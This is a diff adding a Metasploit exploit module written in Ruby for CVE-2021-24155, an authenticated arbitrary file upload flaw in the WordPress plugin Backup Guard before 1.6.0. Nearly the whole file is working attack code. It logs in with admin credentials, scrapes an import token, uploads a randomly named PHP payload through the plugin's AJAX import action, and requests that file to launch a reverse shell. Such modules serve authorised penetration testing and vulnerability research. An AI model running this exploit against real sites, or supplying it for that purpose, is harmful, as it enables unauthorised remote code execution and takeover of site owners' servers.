@@ -1,0 +1,125 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  prepend Msf::Exploit::Remote::AutoCheck
+  include Msf::Exploit::CmdStager
+  include Msf::Exploit::Remote::HTTP::Wordpress
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Wordpress Plugin Backup Guard - Authenticated Remote Code Execution',
+        'Description' => %q{
+          This module allows an attacker with a privileged Wordpress account to launch a reverse shell
+          due to an arbitrary file upload vulnerability in Wordpress plugin Backup Guard < 1.6.0.
+          This is due to an incorrect check of the uploaded file extension which should be of SGBP type.
+          Then, the uploaded payload can be triggered by a call to `/wp-content/uploads/backup-guard/<random_payload_name>.php`
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'Nguyen Van Khanh', # Original PoC, discovery
+          'Ron Jost', # Exploit-db
+          'Yann Castel (yann.castel[at]orange.com)' # Metasploit module
+        ],
+        'References' => [
+          ['EDB', '50093'],
+          ['CVE', '2021-24155'],
+          ['CWE', '434'],
+          ['WPVDB', 'd442acac-4394-45e4-b6bb-adf4a40960fb'],
+          ['URL', 'https://plugins.trac.wordpress.org/changeset?sfp_email=&sfph_mail=&reponame=&new=2473510%40backup&old=2472212%40backup&sfp_email=&sfph_mail=']
+        ],
+        'Platform' => [ 'php' ],
+        'Arch' => ARCH_PHP,
+        'Targets' => [
+          [ 'Wordpress Backup Guard < 1.6.0', {}]
+        ],
+        'Privileged' => false,
+        'DisclosureDate' => '2021-05-04',
+        'Notes' => {
+          'Stability' => [ CRASH_SAFE ],
+          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],
+          'Reliability' => [ REPEATABLE_SESSION ]
+        }
+      )
+    )
+
+    register_options [
+      OptString.new('USERNAME', [true, 'Username of the admin account', 'admin']),
+      OptString.new('PASSWORD', [true, 'Password of the admin account', 'admin']),
+      OptString.new('TARGETURI', [true, 'The base path of the Wordpress server', '/'])
+    ]
+  end
+
+  def check
+    return CheckCode::Unknown('Server not online or not detected as wordpress') unless wordpress_and_online?
+
+    cookie = wordpress_login(datastore['USERNAME'], datastore['PASSWORD'])
+    return CheckCode::Detected('Authentication to Wordpress failed.') unless cookie
+
+    check_plugin_version_from_readme('backup', '1.6.0')
+  end
+
+  def get_token(cookie)
+    r = send_request_cgi({
+      'method' => 'GET',
+      'cookie' => cookie,
+      'uri' => normalize_uri(target_uri.path, 'wp-admin/admin.php'),
+      'Referer' => full_uri('/wp-admin/users.php'),
+      'vars_get' => {
+        'page' => 'backup_guard_backups'
+      }
+    })
+    fail_with(Failure::Unknown, "Target #{RHOST} could not be reached.") unless r
+    res = r.body.to_s.match(/&token=(\h+)/)
+    fail_with(Failure::UnexpectedReply, 'Failed to retrieve the token.') unless res
+    res[1]
+  end
+
+  def exploit
+    cookie = wordpress_login(datastore['USERNAME'], datastore['PASSWORD'])
+    fail_with(Failure::UnexpectedReply, 'Authentication failed') unless cookie
+    token = get_token(cookie)
+    fail_with(Failure::UnexpectedReply, 'Failed to retrieve the Backup Guard token') unless token
+    payload_name = "#{Rex::Text.rand_text_alpha_lower(5)}.php"
+
+    post_data = Rex::MIME::Message.new
+    post_data.add_part(payload.encoded, 'text/php', nil, "form-data; name='files[]'; filename=#{payload_name}")
+
+    print_status("Uploading file \'#{payload_name}\' containing the payload...")
+
+    r = send_request_cgi(
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri.path, '/wp-admin/admin-ajax.php'),
+      'headers' => {
+        'Origin' => full_uri(''),
+        'Referer' => full_uri('/wp-admin/admin.php?page=backup_guard_backups'),
+        'X-Requested-With' => 'XMLHttpRequest'
+      },
+      'vars_get' =>
+      {
+        'action' => 'backup_guard_importBackup',
+        'token' => token
+      },
+      'cookie' => cookie,
+      'data' => post_data.to_s,
+      'ctype' => "multipart/form-data; boundary=#{post_data.bound}"
+    )
+
+    fail_with(Failure::UnexpectedReply, "Wasn't able to upload the payload file") unless r&.code == 200
+    register_files_for_cleanup(payload_name.to_s)
+
+    print_status('Triggering the payload ...')
+    send_request_cgi(
+      'method' => 'GET',
+      'cookie' => cookie,
+      'uri' => normalize_uri(target_uri.path, "/wp-content/uploads/backup-guard/#{payload_name}")
+    )
+  end
+end
